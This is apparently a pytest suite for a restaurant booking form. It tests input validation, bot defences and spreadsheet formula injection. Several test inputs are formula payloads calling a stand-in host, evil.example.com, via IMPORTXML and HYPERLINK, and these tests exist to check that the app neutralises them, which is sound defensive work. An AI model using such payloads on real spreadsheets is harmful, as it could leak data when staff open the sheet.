"""
Booking form tests.

Run with:  python3 -m pytest tests/ -v

A booking is ACCEPTED when the response is a 302 redirect to the success page
and a row lands in the spreadsheet. It is REJECTED when nothing is written.
"""
from datetime import timedelta

import pytest

from conftest import days_from_now, get_form_token, submit, sydney_now, valid_booking


def assert_accepted(response, sheets):
    assert response.status_code == 302, \
        f"expected redirect to success page, got {response.status_code}"
    assert '/reservation_success' in response.headers.get('Location', '')
    assert len(sheets.master.rows) > 1, "booking was not written to the sheet"


def assert_rejected(response, sheets, expect_message=None):
    assert response.status_code in (302, 400, 429), \
        f"unexpected status {response.status_code}"
    assert len(sheets.master.rows) == 1, \
        f"REJECTED booking still got written to the sheet: {sheets.master.rows[1:]}"
    if expect_message:
        assert expect_message.lower() in response.get_data(as_text=True).lower(), \
            f"expected error message containing {expect_message!r}"


# ---------------------------------------------------------------------------
# The happy path
# ---------------------------------------------------------------------------

class TestValidBookings:

    def test_a_normal_booking_works(self, client, sheets):
        assert_accepted(submit(client), sheets)

    def test_booking_is_saved_with_the_right_values(self, client, sheets):
        date = days_from_now(5)
        submit(client, name='Jane Smith', date=date, time='18:30', people='7-10')
        row = sheets.master.rows[1]
        # [id, name, date, time, people, dish, phone, email, notes, booked_at]
        assert row[1] == 'Jane Smith'
        assert row[2] == date
        assert row[3] == '18:30'
        assert row[4] == '7-10'
        assert row[6] == '61412345678', "phone should be normalised to 61..."


class TestBookedAtColumn:
    """Column J records when the booking was submitted, as DD/MM/YY HH:MM."""

    def test_the_row_has_a_booked_at_value(self, client, sheets):
        submit(client)
        row = sheets.master.rows[1]
        assert len(row) == 10, f"expected 10 columns, got {len(row)}: {row}"
        assert row[9], "booked-at column is empty"

    def test_it_is_formatted_day_month_year_hour_minute(self, client, sheets):
        import re
        submit(client)
        booked_at = sheets.master.rows[1][9]
        assert re.fullmatch(r'\d{2}/\d{2}/\d{2} \d{2}:\d{2}', booked_at), \
            f"expected DD/MM/YY HH:MM, got {booked_at!r}"

    def test_it_records_now_in_sydney_time(self, client, sheets):
        from datetime import datetime, timedelta
        import app as flask_app
        submit(client)
        booked_at = sheets.master.rows[1][9]
        stamp = datetime.strptime(booked_at, '%d/%m/%y %H:%M')
        now = datetime.now(flask_app.sydney_tz).replace(tzinfo=None)
        assert abs((now - stamp).total_seconds()) < 120, \
            f"booked-at {booked_at} is not close to Sydney now {now:%d/%m/%y %H:%M}"

    def test_it_is_the_submission_time_not_the_booking_date(self, client, sheets):
        """A booking for next month must still be stamped with today."""
        from datetime import datetime
        import app as flask_app
        submit(client, date=days_from_now(30))
        booked_at = sheets.master.rows[1][9]
        today = datetime.now(flask_app.sydney_tz).strftime('%d/%m/%y')
        assert booked_at.startswith(today), \
            f"expected today ({today}), got {booked_at}"

    def test_rejected_bookings_write_nothing(self, client, sheets):
        submit(client, phone='+1-555-000-1111')
        assert len(sheets.master.rows) == 1

    def test_booking_also_appears_on_the_date_sheet(self, client, sheets):
        date = days_from_now(4)
        submit(client, date=date)
        assert date in sheets.date_sheets, "no per-date sheet was created"
        assert len(sheets.date_sheets[date].rows) == 2, "expected header + 1 booking"

    @pytest.mark.parametrize('phone', [
        '0412345678',
        '0412 345 678',
        '+61412345678',
        '+61 412 345 678',
        '61412345678',
        '0498 765 432',
    ])
    def test_australian_phone_formats_are_accepted(self, client, sheets, phone):
        assert_accepted(submit(client, phone=phone), sheets)
        assert sheets.master.rows[1][6].startswith('614')

    @pytest.mark.parametrize('name', ['Jane Smith', "Jane O'Brien", 'Anne-Marie Lee', '李伟', 'Nguyễn Văn A'])
    def test_real_names_are_accepted(self, client, sheets, name):
        assert_accepted(submit(client, name=name), sheets)

    @pytest.mark.parametrize('people', ['1-2', '3-4', '4-6', '7-10', '10+'])
    def test_every_party_size_option_works(self, client, sheets, people):
        assert_accepted(submit(client, people=people), sheets)

    @pytest.mark.parametrize('time', ['12:00', '13:30', '17:00', '19:00', '20:30'])
    def test_every_time_option_works(self, client, sheets, time):
        assert_accepted(submit(client, time=time), sheets)

    @pytest.mark.parametrize('dish', ['大火锅', '小火锅', '炒菜'])
    def test_every_dish_option_works(self, client, sheets, dish):
        assert_accepted(submit(client, **{'dish-type': dish}), sheets)

    def test_notes_are_optional(self, client, sheets):
        assert_accepted(submit(client, notes=''), sheets)

    def test_booking_one_week_out_works(self, client, sheets):
        assert_accepted(submit(client, date=days_from_now(7)), sheets)


# ---------------------------------------------------------------------------
# Missing / placeholder values — this is what the spam bots were sending
# ---------------------------------------------------------------------------

class TestMissingFields:

    def test_no_party_size_is_rejected(self, client, sheets):
        assert_rejected(submit(client, people=''), sheets, 'required')

    def test_placeholder_party_size_is_rejected(self, client, sheets):
        """'Select party size' is the dropdown's placeholder text, not a real value."""
        assert_rejected(submit(client, people='Select party size'), sheets, 'party size')

    def test_no_time_is_rejected(self, client, sheets):
        assert_rejected(submit(client, time=''), sheets, 'required')

    def test_placeholder_time_is_rejected(self, client, sheets):
        assert_rejected(submit(client, time='Select time'), sheets, 'booking time')

    def test_no_dish_type_is_rejected(self, client, sheets):
        assert_rejected(submit(client, **{'dish-type': ''}), sheets, 'required')

    def test_placeholder_dish_type_is_rejected(self, client, sheets):
        assert_rejected(submit(client, **{'dish-type': 'Type of Dish'}), sheets, 'type of dish')

    def test_no_name_is_rejected(self, client, sheets):
        assert_rejected(submit(client, name=''), sheets, 'required')

    def test_no_email_is_rejected(self, client, sheets):
        assert_rejected(submit(client, email=''), sheets, 'required')

    def test_no_phone_is_rejected(self, client, sheets):
        assert_rejected(submit(client, phone=''), sheets, 'mobile')

    def test_no_date_is_rejected(self, client, sheets):
        assert_rejected(submit(client, date=''), sheets, 'required')

    def test_made_up_party_size_is_rejected(self, client, sheets):
        assert_rejected(submit(client, people='500'), sheets, 'party size')

    def test_made_up_time_is_rejected(self, client, sheets):
        assert_rejected(submit(client, time='03:00'), sheets, 'booking time')


# ---------------------------------------------------------------------------
# Email
# ---------------------------------------------------------------------------

class TestEmailValidation:

    @pytest.mark.parametrize('email', [
        'not-an-email',
        'missing-at-sign.com',
        '@nolocalpart.com',
        'no-domain@',
        'no-tld@example',
        'spaces in@example.com',
        'two@@example.com',
    ])
    def test_invalid_emails_are_rejected(self, client, sheets, email):
        assert_rejected(submit(client, email=email), sheets, 'email')

    @pytest.mark.parametrize('email', [
        'jane@gmail.com',
        'jane.smith@example.com.au',
        'jane+bookings@gmail.com',
        'j.s.smith@sub.domain.org',
    ])
    def test_valid_emails_are_accepted(self, client, sheets, email):
        assert_accepted(submit(client, email=email), sheets)

    def test_absurdly_long_email_is_rejected(self, client, sheets):
        assert_rejected(submit(client, email='a' * 200 + '@example.com'), sheets, 'too long')


# ---------------------------------------------------------------------------
# Phone
# ---------------------------------------------------------------------------

class TestPhoneValidation:

    @pytest.mark.parametrize('phone', [
        '+1-800-390-6904',      # US number from the real spam
        '+1-087-947-8076',
        '1234',                 # too short
        '0212345678',           # landline, not a mobile
        'not a phone number',
        '04123456789012345',    # too long
    ])
    def test_invalid_phones_are_rejected(self, client, sheets, phone):
        assert_rejected(submit(client, phone=phone), sheets, 'mobile')

    def test_phone_is_normalised_before_saving(self, client, sheets):
        submit(client, phone='+61 412 345 678')
        assert sheets.master.rows[1][6] == '61412345678'


# ---------------------------------------------------------------------------
# Dates — the actual spam symptom
# ---------------------------------------------------------------------------

class TestDateValidation:

    @pytest.mark.parametrize('date', ['2023-02-26', '2024-08-17', '2025-01-04', '2025-04-13'])
    def test_past_dates_are_rejected(self, client, sheets, date):
        """These are real dates from the spam bookings."""
        assert_rejected(submit(client, date=date), sheets, 'past date')

    def test_yesterday_is_rejected(self, client, sheets):
        assert_rejected(submit(client, date=days_from_now(-1)), sheets, 'past date')

    def test_far_future_date_is_rejected(self, client, sheets):
        # Relative, not a fixed date: a hardcoded one silently drifts inside the
        # booking window as time passes and the test then fails for no reason.
        assert_rejected(submit(client, date=days_from_now(45)), sheets, 'one month')

    def test_two_months_out_is_rejected(self, client, sheets):
        assert_rejected(submit(client, date=days_from_now(60)), sheets, 'one month')

    def test_just_inside_one_month_is_accepted(self, client, sheets):
        assert_accepted(submit(client, date=days_from_now(30)), sheets)

    def test_just_outside_one_month_is_rejected(self, client, sheets):
        assert_rejected(submit(client, date=days_from_now(40)), sheets, 'one month')

    @pytest.mark.parametrize('date', ['not-a-date', '13/04/2025', '2025-13-45', '99999999'])
    def test_malformed_dates_are_rejected(self, client, sheets, date):
        assert_rejected(submit(client, date=date), sheets, 'valid date')


ALL_SLOTS = ['12:00', '12:30', '13:00', '13:30', '17:00', '17:30',
             '18:00', '18:30', '19:00', '19:30', '20:00', '20:30']


def minutes_until(slot, now):
    hour, minute = (int(p) for p in slot.split(':'))
    return (hour * 60 + minute) - (now.hour * 60 + now.minute)


class TestSameDayBookings:
    """Same-day bookings are allowed, but only 2+ hours ahead."""

    def test_same_day_far_enough_ahead_is_accepted(self, client, sheets):
        now = sydney_now()
        slot = next((s for s in ALL_SLOTS if minutes_until(s, now) >= 150), None)
        if slot is None:
            pytest.skip(f"no slot 2.5h+ away at {now.strftime('%H:%M')} Sydney time")
        assert_accepted(submit(client, date=days_from_now(0), time=slot), sheets)

    def test_same_day_too_soon_is_rejected(self, client, sheets):
        now = sydney_now()
        slot = next((s for s in ALL_SLOTS if 0 <= minutes_until(s, now) < 110), None)
        if slot is None:
            pytest.skip(f"no slot inside the 2h window at {now.strftime('%H:%M')} Sydney time")
        assert_rejected(submit(client, date=days_from_now(0), time=slot), sheets, '2 hours')

    def test_same_day_rule_directly(self, client, sheets, app_module):
        """Time-independent version: exercise the validator itself."""
        validate = app_module.validate_reservation
        now = sydney_now()
        today = now.strftime('%Y-%m-%d')

        for slot in ALL_SLOTS:
            gap = minutes_until(slot, now)
            _, error = validate(valid_booking(date=today, time=slot))
            if gap >= 120:
                assert error is None, f"{slot} is {gap}min away and should be allowed"
            else:
                assert error is not None, f"{slot} is only {gap}min away and must be blocked"


# ---------------------------------------------------------------------------
# Bot defences
# ---------------------------------------------------------------------------

class TestBotProtection:

    def test_direct_post_without_a_token_is_rejected(self, client, sheets):
        """This is exactly how the spam bookings were getting in."""
        response = client.post('/submit_reservation', data=valid_booking())
        assert_rejected(response, sheets)

    def test_a_stolen_or_guessed_token_is_rejected(self, client, sheets):
        form = valid_booking()
        form['form_token'] = 'a' * 32
        assert_rejected(client.post('/submit_reservation', data=form), sheets)

    def test_the_same_token_cannot_be_used_twice(self, client, sheets):
        """Stops double-bookings from a refresh or a back-button resubmit."""
        form = valid_booking()
        form['form_token'] = get_form_token(client)
        first = client.post('/submit_reservation', data=form)
        assert first.status_code == 302
        rows_after_first = len(sheets.master.rows)

        second = client.post('/submit_reservation', data=form)
        assert second.status_code == 302
        assert len(sheets.master.rows) == rows_after_first, "duplicate booking got through"

    def test_filling_the_honeypot_field_is_rejected(self, client, sheets):
        """The 'website' field is invisible to humans; only bots fill it."""
        assert_rejected(submit(client, website='http://spam.example.com'), sheets)

    def test_submitting_faster_than_a_human_is_rejected(self, client, sheets, app_module, monkeypatch):
        monkeypatch.setattr(app_module, 'MIN_FILL_SECONDS', 30)
        assert_rejected(submit(client), sheets)

    def test_the_exact_spam_bookings_are_all_blocked(self, client, sheets):
        """Verbatim rows from the real spreadsheet."""
        spam = [
            dict(name='gfnojodesj', date='2025-04-13', phone='+1-087-947-8076',
                 email='knhallock@gmail.com', notes='ldxxxldhqx'),
            dict(name='xizgsgdtue', date='2024-08-17', phone='+1-511-992-2704',
                 email='ritzadesign@gmail.com', notes='hfilukgzmf'),
            dict(name='qssurhfinm', date='2026-09-12', phone='+1-948-729-4772',
                 email='schmitz9@gmail.com', notes='nojummnszd'),
            dict(name='fzwtinyxwi', date='2023-02-26', phone='+1-053-221-2585',
                 email='neketh00@yahoo.com', notes='yvsdmzruol'),
            dict(name='ttqekxizzj', date='2025-01-04', phone='+1-800-390-6904',
                 email='neketh00@yahoo.com', notes='xixijytpur'),
        ]
        for row in spam:
            response = submit(client, time='Select time', people='Select party size',
                              **{'dish-type': 'Type of Dish'}, **row)
            assert_rejected(response, sheets)


class TestRateLimiting:

    def test_a_flood_of_bookings_gets_cut_off(self, client, sheets):
        statuses = [submit(client).status_code for _ in range(10)]
        assert 429 in statuses, "rate limit never kicked in"
        assert statuses[0] == 302, "the first booking should still succeed"
        assert len(sheets.master.rows) - 1 <= 5, "more than 5 bookings per hour got through"

    def test_typos_do_not_lock_a_real_customer_out(self, client, sheets):
        """Someone mistyping their phone 6 times must still be able to book."""
        for _ in range(6):
            submit(client, phone='+1-555-000-1111')
        assert_accepted(submit(client), sheets)


# ---------------------------------------------------------------------------
# Spreadsheet formula injection
# ---------------------------------------------------------------------------

class TestFormulaInjection:
    """Text starting with = + @ - executes as a formula when staff open the sheet."""

    def test_formula_in_notes_is_defused(self, client, sheets):
        submit(client, notes='=IMPORTXML("http://evil.example.com","//a")')
        saved_notes = sheets.master.rows[1][8]
        assert saved_notes.startswith("'"), f"formula was not neutralised: {saved_notes!r}"

    @pytest.mark.parametrize('payload', [
        '=1+1',
        '+1234567',
        '@SUM(A1:A9)',
        '-HYPERLINK("http://evil.example.com")',
    ])
    def test_formula_prefixes_in_notes_are_defused(self, client, sheets, payload):
        submit(client, notes=payload)
        assert sheets.master.rows[1][8].startswith("'")

    def test_formula_in_name_is_blocked_or_defused(self, client, sheets):
        response = submit(client, name='=IMPORTXML("http://evil.example.com","//a")')
        if response.status_code == 302:
            assert sheets.master.rows[1][1].startswith("'")
        else:
            assert_rejected(response, sheets)

    def test_ordinary_notes_are_left_alone(self, client, sheets):
        submit(client, notes='2 high chairs please')
        assert sheets.master.rows[1][8] == '2 high chairs please'


# ---------------------------------------------------------------------------
# Field lengths
# ---------------------------------------------------------------------------

class TestFieldLengths:

    def test_very_long_name_is_rejected(self, client, sheets):
        assert_rejected(submit(client, name='x' * 500), sheets, 'too long')

    def test_very_long_notes_are_rejected(self, client, sheets):
        assert_rejected(submit(client, notes='x' * 1000), sheets, 'too long')

    def test_a_normal_length_note_is_fine(self, client, sheets):
        assert_accepted(submit(client, notes='Please seat us near a window, ' * 3), sheets)
